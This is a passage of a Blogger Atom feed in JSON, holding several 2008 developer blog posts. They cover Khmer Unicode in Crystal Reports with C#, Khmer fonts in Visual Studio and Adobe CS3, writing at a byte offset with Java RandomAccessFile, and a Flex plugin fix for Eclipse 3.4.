+            "term": "Crystal Report"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Fonts"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Visual Studio"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "VS 2005"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "VS 2008"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Khmer Unicode with Crystal Report in C# Application"
+        },
+        "content": {
+          "type": "html",
+          "$t": "I use VS2008 to test Khmer Unicode rendering in Crystal Report.<br /><br /><span style=\"font-weight: bold;\">I. Prepare Crystal Report Render well in report design</span><br />First you have to make the crystal report in design time possible to write or view Khmer Unicode<br /><br /><span style=\"font-weight: bold;\">1.1. Copy usp10.dll</span> (version1.465.4001.0) to C:\\Program Files\\Business Objects\\Common\\2.8\\bin<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA86P2tOeC_b4z2zGHXHPpDVuHtfd-IKxhSO13__h0Akw1_ClEoaHBpsYQnp8FlOtfVeHW-kXoZResDX2fqMaREAn9tRHv_IpjZlaVZzVx1xbyhNKOblFMp9_PKeKoQ3Ng6GKpBRL3aQpJ/s1600-h/kh-crystal-0.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 259px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA86P2tOeC_b4z2zGHXHPpDVuHtfd-IKxhSO13__h0Akw1_ClEoaHBpsYQnp8FlOtfVeHW-kXoZResDX2fqMaREAn9tRHv_IpjZlaVZzVx1xbyhNKOblFMp9_PKeKoQ3Ng6GKpBRL3aQpJ/s320/kh-crystal-0.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5284042433005610258\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><span style=\"font-weight: bold;\"><br />1.2. Change fonts setting</span> in Crystal Report, <span style=\"font-weight: bold;\">at VS2008, create a crystal report and go to Crystal Reports --> Design --> Default Setting --> Go to Fonts Tab, change all element to Kh System</span><br /><br /><span style=\"font-weight: bold;\">II. View Crystal Report with VS Crystal Report Viewer,</span><br />Khmer Unicode is not rendering well.<br />(Under research)<br /><br /><span style=\"font-weight: bold;\">III.</span><span style=\"font-weight: bold;\"> View Crystal Report with Crystal Report View</span><br />It's working very well for me to view Crystal Report with Khmer Unicode characters on form.<br />Here is the process...<br /><br /><span style=\"font-weight: bold;\">3.1. On design time, </span>add COM control of Crystal Report ActiveX Report Viewer Control of Business Objects; from my pc, it's a dll at: C:\\Program Files\\Business Objects\\Common\\2.8\\bin\\ crviewer.dll<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPWOL16oKQ5fjxU7laAnnG4R82tBld-hNXD7BVQbYpa0Zo5nESc2IBHGvIPMDQKdd7pn7IcPSUeA_fiourz5W_DYb5Q6llf0C1RYGAEq-61S8QKKXMCkt43XLbbprV4cGT6ZcC5kLiXeNo/s1600-h/crystal-control-01.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 158px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgPWOL16oKQ5fjxU7laAnnG4R82tBld-hNXD7BVQbYpa0Zo5nESc2IBHGvIPMDQKdd7pn7IcPSUeA_fiourz5W_DYb5Q6llf0C1RYGAEq-61S8QKKXMCkt43XLbbprV4cGT6ZcC5kLiXeNo/s320/crystal-control-01.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5285912126658710914\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><span style=\"font-weight: bold;\"><br />3.2. Add Reference in the project of craxddrt.dll</span><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaZRZMXbmHbz0PIxEot32CbyeDuqJqxhDiXcKSygTjiXR4H9kNbwl4s5sGITISXKGFChxPHZ1zcmLeLGrfNLNEiwvOK2IUV_JhqZfLlEBK5DHlcf8YNmDXk48TeEX44JqV0Y7vMTlCwQ3D/s1600-h/crystal-control-02.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 266px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiaZRZMXbmHbz0PIxEot32CbyeDuqJqxhDiXcKSygTjiXR4H9kNbwl4s5sGITISXKGFChxPHZ1zcmLeLGrfNLNEiwvOK2IUV_JhqZfLlEBK5DHlcf8YNmDXk48TeEX44JqV0Y7vMTlCwQ3D/s320/crystal-control-02.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5285914898859145394\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><span style=\"font-weight: bold;\"><br />3.3. Create Crystal Report</span> and write some code in Khmer Unicode and save it to some where, my example in folder bin/Debug<br /><br /><span style=\"font-weight: bold;\">3.4. Coding</span> to call the report to view in the control:<br /><br /><pre><code><br />CRAXDDRT.Application crxApp = new CRAXDDRT.Application();<br />CRAXDDRT.Report crxReport = new CRAXDDRT.Report();<br />crxReport = crxApp.OpenReport(Application.StartupPath<br />                       + \"/KhmerUnicodeTest.rpt\", null);<br />this.axCrystalActiveXReportViewer1.ReportSource=crxReport;  <br />this.axCrystalActiveXReportViewer1.ViewReport();<br /></code></pre><br /><span style=\"font-weight: bold;\">3.5. Here is the result display</span><br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy7OyBu-8fhYZwxIj3JVUuxgX3pM82u0dYMZ1CiQ73Q6dWlVw1gfZkY6gC5QKtdEmPiSmGWfHLSnL4Lo7pqNSxxmZRKjgQccFDMLH1FvdrESWVEm8gQArLSDWQ-VF80rkmZOQSwfClkBDq/s1600-h/crystal-control-03.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 161px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEgy7OyBu-8fhYZwxIj3JVUuxgX3pM82u0dYMZ1CiQ73Q6dWlVw1gfZkY6gC5QKtdEmPiSmGWfHLSnL4Lo7pqNSxxmZRKjgQccFDMLH1FvdrESWVEm8gQArLSDWQ-VF80rkmZOQSwfClkBDq/s320/crystal-control-03.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5285917276442481794\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><span style=\"font-weight: bold;\">DOWNLOAD</span>: <a href=\"http://www.snapdrive.net/files/583222/Software/TestCrystalReportViewer.zip\">Sample Project: TestCrystalReportViewer</a><br /><br /><span style=\"font-weight: bold;\">IV. View Crystal Report by export directly to PDF</span><br />It works very well, just have issue with font size.<br />We just call Crystal Report Object and then export it to disk, here is the coding:<br /><br /><pre><code><br />private void btnPrintCrystal_Click(object sender, EventArgs e)<br />{    <br />CrystalKhmerUnicode rptCrystal = new CrystalKhmerUnicode();<br />rptCrystal.SetParameterValue(\"txtReportTitle\",\"Hello World\");<br />rptCrystal.SetParameterValue(\"txtTitle\", txtTitle.Text);<br />rptCrystal.SetParameterValue(\"txtArticle\", txtArticle.Text);<br />rptCrystal.ExportToDisk(ExportFormatType.PortableDocFormat, \"./KhmerUnicode.pdf\");<br />MessageBox.Show(\"Now report exported to current folder: KhmerUnicode.pdf\");<br />// Direct open pdf report<br />System.Diagnostics.Process.Start(\"./KhmerUnicode.pdf\");   <br />}<br /></code></pre><br />Enjoy,<br />Happy New Year 2009!<br />Metrey,"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/6513108341502746120/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/khmer-unicode-with-crystal-report-in-c.html#comment-form",
+            "title": "25 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6513108341502746120"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/6513108341502746120"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/khmer-unicode-with-crystal-report-in-c.html",
+            "title": "Khmer Unicode with Crystal Report in C# Application"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjA86P2tOeC_b4z2zGHXHPpDVuHtfd-IKxhSO13__h0Akw1_ClEoaHBpsYQnp8FlOtfVeHW-kXoZResDX2fqMaREAn9tRHv_IpjZlaVZzVx1xbyhNKOblFMp9_PKeKoQ3Ng6GKpBRL3aQpJ/s72-c/kh-crystal-0.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "25"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5793756980620589788"
+        },
+        "published": {
+          "$t": "2008-12-25T23:49:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2008-12-26T00:15:40.609-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Visual Studio"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "VS 2005"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "VS 2008"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Wanna to write Khmer Unicode on coding in VS2005 or VS2008?"
+        },
+        "content": {
+          "type": "html",
+          "$t": "In fact, I know many people should already know it but I suppose to post here that maybe help others to search for.<br /><br />I want to write Khmer Unicode text in coding in Visual Studio 2005 or 2008, maybe need to assign value or declare parameter in Khmer etc. So we need to make the editor know Khmer Unicode first.<br /><br />After your PC running well with Khmer Unicode, please follow this instruction to make it possible to write Khmer on your code:<br /><br />In Visual Studio option: Tools --> Options --> at Environment, Fonts and Colors set font to: Kh System, then it works.<br /><br />See screens:<br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlzZ0sGUJxur2pybwl_gEd3Axi4YZNPJLhrdZ6kbdOA7-6W-PFQJgQQcmWiP7vDcfsxoVT0IZ_ODTz4DB7OxK_6uEMCep85DJawMt7Bq77A9ugs3ZbbEJ_nvRid7VrP4hPObvkjq1buPcQ/s1600-h/KH-ON-VS2008-CODING.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 186px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlzZ0sGUJxur2pybwl_gEd3Axi4YZNPJLhrdZ6kbdOA7-6W-PFQJgQQcmWiP7vDcfsxoVT0IZ_ODTz4DB7OxK_6uEMCep85DJawMt7Bq77A9ugs3ZbbEJ_nvRid7VrP4hPObvkjq1buPcQ/s320/KH-ON-VS2008-CODING.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5284004729168815202\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Here, after change, what I can write:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheLtetTVOhGzWRtUSmNuMiye_wFN3U57Dw3fIL_8hD7ksQPGDs8Y1I_lCuUi470k8seARLkl65SHCtjHD_Igwxm1yIswiBuQQb_r3kP4KfP389DvWu8MNcGXu-WhRg9cw0f5cz9sodsYf3/s1600-h/KH-ON-VS2008-CODING_1.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 93px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEheLtetTVOhGzWRtUSmNuMiye_wFN3U57Dw3fIL_8hD7ksQPGDs8Y1I_lCuUi470k8seARLkl65SHCtjHD_Igwxm1yIswiBuQQb_r3kP4KfP389DvWu8MNcGXu-WhRg9cw0f5cz9sodsYf3/s320/KH-ON-VS2008-CODING_1.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5284008091634870306\" border=\"0\" /></a>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5793756980620589788/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/wanna-to-write-khmer-unicode-on-coding.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5793756980620589788"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5793756980620589788"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/wanna-to-write-khmer-unicode-on-coding.html",
+            "title": "Wanna to write Khmer Unicode on coding in VS2005 or VS2008?"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjlzZ0sGUJxur2pybwl_gEd3Axi4YZNPJLhrdZ6kbdOA7-6W-PFQJgQQcmWiP7vDcfsxoVT0IZ_ODTz4DB7OxK_6uEMCep85DJawMt7Bq77A9ugs3ZbbEJ_nvRid7VrP4hPObvkjq1buPcQ/s72-c/KH-ON-VS2008-CODING.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-5565456749426173810"
+        },
+        "published": {
+          "$t": "2008-12-23T21:55:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2008-12-24T01:24:37.539-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Adobe CS3"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Design"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Fonts"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Khmer Unicode"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Khmer Unicode works now with Adobe CS3"
+        },
+        "content": {
+          "type": "html",
+          "$t": "Very good news for us, Khmer, that we have now the fonts that work with Adobe CS3.<br />It's easy to configure as in fact, we just install new fonts from Khmer OS (I'm not sure yet where is the source of this font), but you can download here: <a style=\"font-weight: bold;\" href=\"http://www.snapdrive.net/files/583222/Software/UnicodeFontSupportAdobe%20CS3.zip\">Khmer Unicode Supported CS3</a>.<br /><br />There are fonts:<br /><ul><li>Kh-Battambang</li><li>Kh-Bokor</li><li>Kh-Content</li><li>Kh-Fasthand</li><li>Kh-Freehand</li><li>Kh-Kangrey</li><li>Kh-Koulen</li><li>Kh-KoulenL</li><li>Kh-Metal-Chrieng</li><li>Kh-Muol</li><li>Kh-Muol-Pali</li><li>Kh-Siemreap</li><li>Kh-System<br /></li></ul><br />The right font view as:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs222u3Kc2j5c0HIieBw-Sv49SMyCN6S401YW6pylHlWmizLjADi6h0vIwlHqnsBXasOKZywQUxGDAJtzvqRvcCVLTlcmzs0EECKwMijDEOYvL1m5M4E2vCJ7lxoB1iOyqLlFEY206BpfL/s1600-h/CS3_0.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 300px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs222u3Kc2j5c0HIieBw-Sv49SMyCN6S401YW6pylHlWmizLjADi6h0vIwlHqnsBXasOKZywQUxGDAJtzvqRvcCVLTlcmzs0EECKwMijDEOYvL1m5M4E2vCJ7lxoB1iOyqLlFEY206BpfL/s400/CS3_0.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5283244666939360642\" border=\"1\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />See how to do it:<br /><br /><span style=\"font-weight: bold;\">1. Install fonts</span>: Start -> Control Panel -> Fonts -> Install New Fonts -> Select Kh fonts to install<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTNW8t7UwFMNvWuD-TXOghqRPfbyO91yn3jKw7rhGLaWzW-3jd2SbnENOMZCS1voQ0f9VRONKRIsqoW2pz5mIwYmMovayDkE5eKLcIEPzSPWMyDEn86zN1wZRwg1OleCvXVcTQtFobq6H/s1600-h/CS3_2.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 215px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEihTNW8t7UwFMNvWuD-TXOghqRPfbyO91yn3jKw7rhGLaWzW-3jd2SbnENOMZCS1voQ0f9VRONKRIsqoW2pz5mIwYmMovayDkE5eKLcIEPzSPWMyDEn86zN1wZRwg1OleCvXVcTQtFobq6H/s320/CS3_2.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5283245394504347074\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><span style=\"font-weight: bold;\">2. On Adobe Photoshop CS3</span>, select a Kh font (Ex: Kh System)<br />Here Example:<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxWSctKuR5L9GRJMK345QWY6cDPT3BVQoMQwr3c9c8LYTjV3taoo8JimiKbgfm5Tkzvq6tCYLb4gGuiJKFC2FUVg18Ln5BYqIvrwT0Q4Fs0Hru-lqNn9VP9fzire_vun7QPsKwvRoVWDQT/s1600-h/CS3_3.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 320px; height: 175px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhxWSctKuR5L9GRJMK345QWY6cDPT3BVQoMQwr3c9c8LYTjV3taoo8JimiKbgfm5Tkzvq6tCYLb4gGuiJKFC2FUVg18Ln5BYqIvrwT0Q4Fs0Hru-lqNn9VP9fzire_vun7QPsKwvRoVWDQT/s320/CS3_3.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5283245545572328994\" border=\"0\" /></a><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br />Note: any font name in group of Kh font will be Ok with CS3, these fonts also can use well with embedded for website without needed usp10.dll, I'll test it first."
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/5565456749426173810/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/khmer-unicode-works-now-with-adobe-cs3.html#comment-form",
+            "title": "4 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5565456749426173810"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/5565456749426173810"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/khmer-unicode-works-now-with-adobe-cs3.html",
+            "title": "Khmer Unicode works now with Adobe CS3"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "media$thumbnail": {
+          "xmlns$media": "http://search.yahoo.com/mrss/",
+          "url": "https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjs222u3Kc2j5c0HIieBw-Sv49SMyCN6S401YW6pylHlWmizLjADi6h0vIwlHqnsBXasOKZywQUxGDAJtzvqRvcCVLTlcmzs0EECKwMijDEOYvL1m5M4E2vCJ7lxoB1iOyqLlFEY206BpfL/s72-c/CS3_0.JPG",
+          "height": "72",
+          "width": "72"
+        },
+        "thr$total": {
+          "$t": "4"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-323929174758237771"
+        },
+        "published": {
+          "$t": "2008-12-22T19:31:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2009-06-10T00:06:30.431-07:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Java"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "RandomAccessFile"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Write to file"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Write a string to the specific line or position in the written file in java"
+        },
+        "content": {
+          "type": "html",
+          "$t": "I got doubt on this point almost 2 hours to seek how can I write a string to a file at the position, I want.<br /><br />Let me try to explain my issue that would help others who will have the same:<br />I extracted the data from database and write it to a file, I have so many queries for one group of lines, the layout of the file is:<br /><br /><pre><code><br />1 line header<br />many lines detail<br /></code></pre><br /><br />On the header, it's the summary of all lines in detail, it's in one query and I need to write first line of the header and a group of lines for detail to prevent OutOfMemory Exception at run time (As my file can have data around 1000 MB or much more than this).<br />One day, I got a request on my dev to modify a rule at the header that i need to count all lines of detail and put in in the header line in one position (position 27),<br />1. I don't want to execute count all queries of detail to find the record as we can count it when each query extract data so that we can reduce some cost of performance issue.<br />2. And we should not keep all lines of detail in StringBuffer or String or in list or map and after finish iterate them to write into file from header and then the details (this way we can count the record lines till queries of detail finished and then add it to header as normal), this solution for sure, we will meet OutOfMemory Exception for hug amount of data.<br />3. So the only solution to write the lines of header and details as normal but try to integrate the record count value to the header line in written file which should not rewrite the new file by read from the written file (performance issue!)..<br /><br />With solution 3/ above, I got the way with RandomAccessFile functionality: Seeking the byte position of records and after the position integrate the value we prefer.<br />As my file is fixed length file, and the field to add is at <span style=\"font-weight: bold;\">position 27 </span>so the end position of it is <span style=\"font-weight: bold;\">26</span>, here is example:<br /><pre><code><br />file.txt: 1 line header and 12 lines of detail:<br />00000000000540000022102008<span style=\"font-weight: bold; color: rgb(255, 0, 0);\">0        </span>98136<br />...<br /></code></pre><br />I need to add value: 12 to the position 27, here is the code:<br /><br /><pre><code><br />/**<br />* @param args<br />* @throws IOException<br />*/<br />public static void main(String[] args) throws IOException {<br />   RandomAccessFile reReadWriteFile = null;<br />   try {<br />       reReadWriteFile = <br />              new RandomAccessFile(\"file.txt\", \"rw\");<br />   } catch (FileNotFoundException e) {<br />       System.out.println(\"Error: \" + e.getMessage());<br />       throw e;<br />   }<br />       <br />   try {<br />       // To search on 26 bytes of field total detail lines <br />       // at header line<br />       reReadWriteFile.seek(26);<br />       reReadWriteFile.writeBytes(\"12\");<br />       reReadWriteFile.close();<br />   } catch (IOException e) {<br />       System.out.println(\"Error: \" + e.getMessage()); <br />       throw e;<br />   }<br />}<br /></code></pre><br /><br />After execute, file.txt: will be<br /><pre><code><br />00000000000540000022102008<span style=\"font-weight: bold; color: rgb(255, 0, 0);\">12       </span>98136<br />...<br /></code></pre><br />Hope it helps you!<br />Metrey,<br /><br />Learning Tip: <a href=\"http://java.sun.com/j2se/1.4.2/docs/api/java/io/RandomAccessFile.html\">API of RandomAccessFile</a>"
+        },
+        "link": [
+          {
+            "rel": "replies",
+            "type": "application/atom+xml",
+            "href": "https://computer-experience.blogspot.com/feeds/323929174758237771/comments/default",
+            "title": "Post Comments"
+          },
+          {
+            "rel": "replies",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/write-string-to-specific-line-or.html#comment-form",
+            "title": "0 Comments"
+          },
+          {
+            "rel": "edit",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/323929174758237771"
+          },
+          {
+            "rel": "self",
+            "type": "application/atom+xml",
+            "href": "https://www.blogger.com/feeds/604585202851795693/posts/default/323929174758237771"
+          },
+          {
+            "rel": "alternate",
+            "type": "text/html",
+            "href": "https://computer-experience.blogspot.com/2008/12/write-string-to-specific-line-or.html",
+            "title": "Write a string to the specific line or position in the written file in java"
+          }
+        ],
+        "author": [
+          {
+            "name": {
+              "$t": "Unknown"
+            },
+            "email": {
+              "$t": "noreply@blogger.com"
+            },
+            "gd$image": {
+              "rel": "http://schemas.google.com/g/2005#thumbnail",
+              "width": "16",
+              "height": "16",
+              "src": "https://img1.blogblog.com/img/b16-rounded.gif"
+            }
+          }
+        ],
+        "thr$total": {
+          "$t": "0"
+        }
+      },
+      {
+        "id": {
+          "$t": "tag:blogger.com,1999:blog-604585202851795693.post-8620007191675059042"
+        },
+        "published": {
+          "$t": "2008-12-18T03:12:00.000-08:00"
+        },
+        "updated": {
+          "$t": "2008-12-18T03:58:05.262-08:00"
+        },
+        "category": [
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Eclipse"
+          },
+          {
+            "scheme": "http://www.blogger.com/atom/ns#",
+            "term": "Flex"
+          }
+        ],
+        "title": {
+          "type": "text",
+          "$t": "Flex build 3.0.194161 not working with Eclipse 3.4 solution"
+        },
+        "content": {
+          "type": "html",
+          "$t": "First I install flex (build: 3.0.194161) to use with Eclipse 3.2.1, it’s working fine. <p>I wan to use my existing flex plugin with Eclipse 3.4, I got problem as describe in this post.</p> <p>I wanna to try to use both eclipse with the same flex plugin, with Eclipse 3.4 I try to install Flex plugin by Software Updates but I could not.</p><p>I found the solution on the net, thanks to <a href=\"http://www.tekool.net/blog/2008/06/28/flex-builder-3-plugin-dont-work-with-eclipse-34\">Tekool.net</a></p><p>I have removed the Flex plugin and then re-install the flex plugin, point to Eclipse 3.4 and <span style=\"font-weight: bold;\">Proceed it with Caution</span></p><p><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1cW7jZoKiiWJUEcRng5-BWn2zDrV439c51BYspeRi9b6jBRVv465SdjFPBUwBz3T9f08tfqemJxJdZlTOU0MkPTH0BNoekmv1iG3aAsXNTYZZdsb09-P2LnOu0l4Z6dUu66YpYmFyVxXQ/s1600-h/ECLIPSE_FLEX_3.4_ERROR.JPG\"><img style=\"margin: 0pt 10px 10px 0pt; float: left; cursor: pointer; width: 400px; height: 279px;\" src=\"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh1cW7jZoKiiWJUEcRng5-BWn2zDrV439c51BYspeRi9b6jBRVv465SdjFPBUwBz3T9f08tfqemJxJdZlTOU0MkPTH0BNoekmv1iG3aAsXNTYZZdsb09-P2LnOu0l4Z6dUu66YpYmFyVxXQ/s400/ECLIPSE_FLEX_3.4_ERROR.JPG\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5281095630220184834\" border=\"0\" /></a> </p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p><br /></p><p>After done, download the patch provided in <a href=\"http://www.tekool.net/blog/2008/06/28/flex-builder-3-plugin-dont-work-with-eclipse-34\">Tekool.net</a> (<a href=\"http://www.tekool.net/blogfiles/flex-builder-3-plugin-dont-work-with-eclipse-34/FB3_Eclipse34_patch.zip\">Direct download here</a>)<br />Replace the plug-in of the patch into Eclipse plug-in of Flex Plug-in<br /></p><p><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" 